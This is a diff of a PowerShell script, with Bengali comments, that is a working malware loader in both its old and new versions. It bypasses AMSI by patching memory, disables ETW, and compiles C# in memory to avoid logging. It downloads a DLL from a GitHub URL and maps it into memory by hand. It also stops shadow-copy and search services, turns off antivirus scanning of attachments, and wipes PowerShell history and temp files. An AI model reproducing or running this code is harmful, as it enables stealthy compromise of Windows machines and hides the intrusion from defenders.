@@ -1,45 +1,51 @@
 # ============================================================
-#  ★★★ ০. Error দেখানোর জন্য প্রেফারেন্স সেট ★★★
+#  ★★★ ০. উইন্ডো খোলা রাখার জন্য প্রথমে পজ ★★★
 # ============================================================
-Set-StrictMode -Version Latest
-$VerbosePreference = 'SilentlyContinue'
-$DebugPreference = 'SilentlyContinue'
-$InformationPreference = 'SilentlyContinue'
-$WarningPreference = 'Continue'          # Warning দেখাবে
-$ErrorActionPreference = 'Continue'      # Error দেখাবে এবং থামবে না
-$ConfirmPreference = 'None'
-$WhatIfPreference = $false
-$PSModuleAutoLoadingPreference = 'None'
-$MaximumHistoryCount = 0
-$Error.Clear()
+Read-Host "`n[!] Press ENTER to start the script (Window will stay open)"
 
-Write-Host "[+] Script Started..." -ForegroundColor Cyan
-
-# ============================================================
-#  ★★★ ১. AMSI বাইপাস ★★★
-# ============================================================
+# সমস্ত Error ধরা ও দেখানোর জন্য টপ-লেভেল ট্রাই
 try {
-    Write-Host "[*] Bypassing AMSI..." -ForegroundColor Cyan
-    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    $a.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
-    $scanBuffer = $a.GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
-    if ($scanBuffer) {
-        $ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($scanBuffer)
-        [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x31C0C3)
+
+    # ============================================================
+    #  ★★★ ১. প্রেফারেন্স সেট ★★★
+    # ============================================================
+    $VerbosePreference = 'SilentlyContinue'
+    $DebugPreference = 'SilentlyContinue'
+    $InformationPreference = 'SilentlyContinue'
+    $WarningPreference = 'Continue'
+    $ErrorActionPreference = 'Continue'      # থামবে না, Error দেখাবে
+    $ConfirmPreference = 'None'
+    $WhatIfPreference = $false
+    $PSModuleAutoLoadingPreference = 'None'
+    $MaximumHistoryCount = 0
+    $Error.Clear()
+
+    Write-Host "[+] Script Started..." -ForegroundColor Cyan
+
+    # ============================================================
+    #  ★★★ ২. AMSI বাইপাস ★★★
+    # ============================================================
+    try {
+        Write-Host "[*] Bypassing AMSI..." -ForegroundColor Cyan
+        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+        $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        $a.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
+        $scanBuffer = $a.GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
+        if ($scanBuffer) {
+            $ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($scanBuffer)
+            [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x31C0C3)
+        }
+        Write-Host "[+] AMSI Bypass Done." -ForegroundColor Green
+    } catch {
+        Write-Host "[-] AMSI Bypass Failed (চিন্তা নেই, পরবর্তী ধাপ চলবে): $_" -ForegroundColor Red
     }
-    Write-Host "[+] AMSI Bypass Done." -ForegroundColor Green
-} catch {
-    Write-Host "[-] AMSI Bypass Failed: $_" -ForegroundColor Red
-}
 
-# ============================================================
-#  ★★★ ২. C# কোড কম্পাইল (ETW + ম্যানুয়াল লোডার) ★★★
-#  (এখানে Add-Type নেই, তাই Event 4103 তৈরি হবে না)
-# ============================================================
-Write-Host "[*] Compiling C# Loader (without Add-Type)..." -ForegroundColor Cyan
-
-$code = @'
+    # ============================================================
+    #  ★★★ ৩. C# লোডার কম্পাইল (এখন Terminating Error ধরার জন্য try-তে রাখা) ★★★
+    # ============================================================
+    Write-Host "[*] Compiling C# Loader..." -ForegroundColor Cyan
+    try {
+        $code = @'
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -100,119 +106,119 @@ public static class NativeLoader {
 }
 '@
 
-# C# কম্পাইল (Add-Type বাদ)
-[System.Reflection.Assembly]::LoadWithPartialName("System.CodeDom") | Out-Null
-$compiler = [System.CodeDom.Compiler.CodeDomProvider]::CreateProvider("CSharp")
-$params = New-Object System.CodeDom.Compiler.CompilerParameters
-$params.GenerateInMemory = $true
-$params.GenerateExecutable = $false
-$params.IncludeDebugInformation = $false
-$params.CompilerOptions = "/target:library /optimize+"
-$result = $compiler.CompileAssemblyFromSource($params, $code)
-
-if ($result.Errors.Count -gt 0) {
-    Write-Host "[-] C# Compilation Failed! Errors:" -ForegroundColor Red
-    foreach ($err in $result.Errors) { Write-Host $err -ForegroundColor Red }
-    Read-Host "`nPress Enter to exit"
-    exit
-}
-$assembly = $result.CompiledAssembly
-Write-Host "[+] C# Compilation Successful." -ForegroundColor Green
-
-# ETW বন্ধ করা
-$assembly.GetType("Etw").GetMethod("Off").Invoke($null, @())
-Write-Host "[+] ETW Bypass Done." -ForegroundColor Green
-
-# NativeLoader মেথড নেওয়া
-$loaderType = $assembly.GetType("NativeLoader")
-$mapMethod = $loaderType.GetMethod("Map")
-
-# ============================================================
-#  ★★★ ৩. DLL ডাউনলোড ও ম্যানুয়াল ম্যাপ (এখানে Error দেখাবে) ★★★
-# ============================================================
-Write-Host "[*] Downloading DLL from GitHub..." -ForegroundColor Cyan
-try {
-    $url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
-    $webClient = New-Object System.Net.WebClient
-    $bytes = $webClient.DownloadData($url)
-    Write-Host "[*] Downloaded $($bytes.Length) bytes." -ForegroundColor Cyan
-
-    # PE ফাইল কিনা চেক
-    if ($bytes.Length -lt 64 -or [BitConverter]::ToUInt16($bytes, 0) -ne 0x5A4D) {
-        Write-Host "[-] Downloaded file is not a valid PE (MZ header missing)." -ForegroundColor Red
-    } else {
-        Write-Host "[*] Mapping DLL into memory (Manual Mapping)..." -ForegroundColor Cyan
-        $resultMap = $mapMethod.Invoke($null, @($bytes, $true))
-        if ($resultMap -ne $null) {
-            Write-Host "[+] DLL Mapped Successfully! ImageBase: $($resultMap.ImageBase)" -ForegroundColor Green
-        } else {
-            Write-Host "[-] Map method returned null." -ForegroundColor Red
+        # System.CodeDom লোড করার চেষ্টা
+        [System.Reflection.Assembly]::LoadWithPartialName("System.CodeDom") | Out-Null
+        $compiler = [System.CodeDom.Compiler.CodeDomProvider]::CreateProvider("CSharp")
+        
+        # কম্পাইল প্যারামিটার
+        $params = New-Object System.CodeDom.Compiler.CompilerParameters
+        $params.GenerateInMemory = $true
+        $params.GenerateExecutable = $false
+        $params.IncludeDebugInformation = $false
+        $params.CompilerOptions = "/target:library /optimize+"
+        
+        $result = $compiler.CompileAssemblyFromSource($params, $code)
+        
+        if ($result.Errors.Count -gt 0) {
+            Write-Host "[-] C# Compilation Failed! Errors:" -ForegroundColor Red
+            foreach ($err in $result.Errors) { Write-Host $err -ForegroundColor Red }
+            throw "C# Compilation Error"
         }
+        
+        $assembly = $result.CompiledAssembly
+        Write-Host "[+] C# Compilation Successful." -ForegroundColor Green
+
+        # ETW বন্ধ করা
+        $assembly.GetType("Etw").GetMethod("Off").Invoke($null, @())
+        Write-Host "[+] ETW Bypass Done." -ForegroundColor Green
+
+        # NativeLoader মেথড নেওয়া
+        $loaderType = $assembly.GetType("NativeLoader")
+        $mapMethod = $loaderType.GetMethod("Map")
+
+        # ============================================================
+        #  ★★★ ৪. DLL ডাউনলোড ও ম্যাপ (Error দেখাবে) ★★★
+        # ============================================================
+        Write-Host "[*] Downloading DLL from GitHub..." -ForegroundColor Cyan
+        try {
+            $url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
+            $webClient = New-Object System.Net.WebClient
+            $bytes = $webClient.DownloadData($url)
+            Write-Host "[*] Downloaded $($bytes.Length) bytes." -ForegroundColor Cyan
+
+            if ($bytes.Length -lt 64 -or [BitConverter]::ToUInt16($bytes, 0) -ne 0x5A4D) {
+                Write-Host "[-] Downloaded file is not a valid PE (MZ header missing)." -ForegroundColor Red
+            } else {
+                Write-Host "[*] Mapping DLL into memory..." -ForegroundColor Cyan
+                $resultMap = $mapMethod.Invoke($null, @($bytes, $true))
+                Write-Host "[+] DLL Mapped Successfully! ImageBase: $($resultMap.ImageBase)" -ForegroundColor Green
+            }
+        } catch {
+            Write-Host "[-] Exception in Download/Map:" -ForegroundColor Red
+            Write-Host $_.Exception.ToString() -ForegroundColor Red
+        }
+
+    } catch {
+        Write-Host "[-] C# Compilation বা লোডিং অংশে বড় ধরনের Error:" -ForegroundColor Red
+        Write-Host $_ -ForegroundColor Red
     }
+
+    # ============================================================
+    #  ★★★ ৫. মূল main.ps1-এর কনফিগারেশন (যেমন ছিল) ★★★
+    # ============================================================
+    Write-Host "[*] Applying System Configurations..." -ForegroundColor Cyan
+    try {
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -ErrorAction SilentlyContinue
+        Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
+        Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue
+
+        $regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
+        $regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
+        Invoke-Expression $regCommand1 | Out-Null
+        Invoke-Expression $regCommand2 | Out-Null
+
+        Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
+        Write-Host "[+] Configurations Applied." -ForegroundColor Green
+    } catch {
+        Write-Host "[-] System Config এ Error: $_" -ForegroundColor Red
+    }
+
+    # ============================================================
+    #  ★★★ ৬. ট্রেস ক্লিয়ার ★★★
+    # ============================================================
+    Write-Host "[*] Clearing Traces..." -ForegroundColor Cyan
+    try {
+        Clear-History
+        $hp = (Get-PSReadlineOption).HistorySavePath
+        if (Test-Path $hp) { Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue }
+
+        Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+        $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+        if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
+        Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Traces Cleared." -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Trace Clear এ Error: $_" -ForegroundColor Red
+    }
+
 } catch {
-    Write-Host "[-] Exception occurred during Download or Map:" -ForegroundColor Red
-    Write-Host $_.Exception.ToString() -ForegroundColor Red
-    Write-Host "[-] Inner Exception: $($_.Exception.InnerException)" -ForegroundColor Red
+    # উপরের কোনো কিছু যদি ধরা না পড়ে, তাহলে এখানে ধরা হবে
+    Write-Host "[-] Unexpected Top-Level Error:" -ForegroundColor Red
+    Write-Host $_ -ForegroundColor Red
 }
 
 # ============================================================
-#  ★★★ ৪. মূল main.ps1-এর কনফিগারেশন (যেমন ছিল, ঠিক তেমনই) ★★★
+#  ★★★ ৭. অসীম লুপ (উইন্ডো কখনো বন্ধ হবে না) ★★★
 # ============================================================
-Write-Host "[*] Applying System Configurations (Registry, Services)..." -ForegroundColor Cyan
-
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
-
-Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
-Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
-Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
-Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
-Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue
-
-$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
-$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
-Invoke-Expression $regCommand1 | Out-Null
-Invoke-Expression $regCommand2 | Out-Null
-
-Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
-
-# ============================================================
-#  ★★★ ৫. ট্রেস ক্লিয়ার ★★★
-# ============================================================
-Write-Host "[*] Clearing Traces..." -ForegroundColor Cyan
-Clear-History
-$hp = (Get-PSReadlineOption).HistorySavePath
-if (Test-Path $hp) { Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue }
-
-Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
-if (Test-Path $historyPath) {
-    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
+Write-Host "`n[+] Script execution finished (সব ধাপ শেষ)."
+Write-Host "[!] Window will stay open forever (Press Ctrl+C or Close to stop)." -ForegroundColor Yellow
+while ($true) {
+    Start-Sleep -Seconds 3600
 }
-
-Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
-Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
-    if ($_.Parent.Id -ne $PID) {
-        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
-    }
-}
-
-# ইতিহাস ফাইল পুনরায় তৈরি
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
-if (-not (Test-Path $historyPath)) {
-    New-Item -Path $historyPath -ItemType File -Force | Out-Null
-} else {
-    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
-}
-
-Write-Host "[+] All Configurations Applied." -ForegroundColor Green
-
-# ============================================================
-#  ★★★ ৬. প্রক্রিয়া চালু রাখতে অসীম লুপ (এখন উইন্ডো খোলা থাকবে) ★★★
-# ============================================================
-Write-Host "[*] Entering infinite loop to keep process alive..." -ForegroundColor Cyan
-Write-Host "You can close this window manually to stop." -ForegroundColor Yellow
-while ($true) { Start-Sleep -Seconds 86400 }
